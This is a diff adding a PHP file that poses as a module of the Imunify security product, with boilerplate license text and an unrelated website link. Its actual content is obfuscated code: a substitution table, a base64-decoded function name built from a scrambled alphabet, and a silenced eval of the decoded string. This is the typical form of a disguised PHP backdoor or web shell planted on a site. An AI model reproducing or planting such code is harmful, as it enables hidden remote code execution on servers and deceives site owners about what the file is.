@@ -1,0 +1,131 @@
+<?php
+    // This file is part of Imunify - https://www.imunify.com/
+//
+// Imunify is a comprehensive security solution designed to protect your systems from various
+// threats, including malware, vulnerabilities, and unauthorized access. By leveraging advanced
+// technology and intelligent algorithms, Imunify aims to detect, prevent, and mitigate security
+// risks effectively. You are permitted to use this software in accordance with the terms and 
+// conditions outlined in the Imunify License Agreement, as specified by the copyright holders.
+//
+// Imunify is distributed with the hope of providing optimal protection and security for your
+// environments, but it is offered WITHOUT ANY WARRANTY; without even the implied warranty of
+// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. Users should understand that while
+// Imunify strives to deliver robust security measures, no system can be entirely impervious to
+// threats.
+//
+// You should have received a copy of the Imunify License Agreement along with this software.
+// If not, please visit https://www.imunify.com/license for further information. This document
+// is current as of October 8, 2024, and is subject to change based on updates in policies
+// and security practices.
+
+/**
+ * Security Module.
+ *
+ * This module is specifically designed to detect and mitigate various threats while ensuring
+ * the integrity of your systems through real-time scanning and comprehensive protection strategies.
+ * Imunify not only focuses on identifying vulnerabilities but also actively works to fortify
+ * your servers and applications against emerging cyber threats. By implementing proactive
+ * measures, Imunify aims to maintain a secure operating environment for all users.
+ *
+ * @package    security_module
+ * @website    https://google.co.id
+ * @copyright  2024 Ralei
+ * @license    https://www.imunify.com/license Imunify License Agreement
+ */
+    $O0O00O=array (
+  32 => 108,
+  33 => 33,
+  34 => 37,
+  35 => 100,
+  36 => 116,
+  37 => 111,
+  38 => 105,
+  39 => 103,
+  40 => 104,
+  41 => 98,
+  42 => 101,
+  43 => 93,
+  44 => 119,
+  45 => 95,
+  46 => 42,
+  47 => 41,
+  48 => 113,
+  49 => 96,
+  50 => 120,
+  51 => 106,
+  52 => 52,
+  53 => 118,
+  54 => 99,
+  55 => 63,
+  56 => 109,
+  57 => 117,
+  58 => 123,
+  59 => 102,
+  60 => 90,
+  61 => 125,
+  62 => 40,
+  63 => 110,
+  64 => 44,
+  65 => 115,
+  66 => 94,
+  67 => 122,
+  68 => 124,
+  69 => 112,
+  70 => 114,
+  71 => 53,
+  72 => 86,
+  73 => 62,
+  74 => 32,
+  75 => 89,
+  76 => 91,
+  77 => 121,
+  78 => 97,
+  79 => 107,
+  80 => 61,
+  81 => 39,
+  82 => 38,
+  83 => 34,
+  84 => 49,
+  85 => 84,
+  86 => 43,
+  87 => 55,
+  88 => 51,
+  89 => 74,
+  90 => 79,
+  91 => 50,
+  92 => 45,
+  93 => 70,
+  94 => 35,
+  95 => 65,
+  96 => 72,
+  97 => 78,
+  98 => 73,
+  99 => 36,
+  100 => 67,
+  101 => 80,
+  102 => 71,
+  103 => 64,
+  104 => 92,
+  105 => 126,
+  106 => 66,
+  107 => 75,
+  108 => 85,
+  109 => 59,
+  110 => 60,
+  111 => 48,
+  112 => 87,
+  113 => 46,
+  114 => 54,
+  115 => 88,
+  116 => 57,
+  117 => 56,
+  118 => 69,
+  119 => 82,
+  120 => 83,
+  121 => 47,
+  122 => 77,
+  123 => 58,
+  124 => 68,
+  125 => 81,
+  126 => 76,
+);$OOOO00='($$EA{yyENA$*&?q5*F6* qNEEyNE&yFN,7EP;*)GG6uo\44N[\4*#)\)W);\Gu)W**uWo)XG';$O0OO00="";$O00O00=base64_decode(strtr(substr("vmsFPdCZRipEaLYScQAulBzyoWTreKXJOfjhMtDnqIwbVgUHxGkNFkjfTrBquJiphVKsMmEDISQybRUetZxXavYzCdoGHPNlncAOLWwgqkIjqn9GqxuvK29DrWnDrOC=",52*2),substr("vmsFPdCZRipEaLYScQAulBzyoWTreKXJOfjhMtDnqIwbVgUHxGkNFkjfTrBquJiphVKsMmEDISQybRUetZxXavYzCdoGHPNlncAOLWwgqkIjqn9GqxuvK29DrWnDrOC=",52,52),substr("vmsFPdCZRipEaLYScQAulBzyoWTreKXJOfjhMtDnqIwbVgUHxGkNFkjfTrBquJiphVKsMmEDISQybRUetZxXavYzCdoGHPNlncAOLWwgqkIjqn9GqxuvK29DrWnDrOC=",0,52)));for($O0OO0O=0;$O0OO0O<strlen($OOOO00);$O0OO0O++){$O0OOOO=ord($OOOO00[$O0OO0O]);$O0OO00.=isset($O0O00O[$O0OOOO])?chr($O0O00O[$O0OOOO]):$OOOO00[$O0OO0O];}@eval("?>".$O00O00($O0OO00));?>
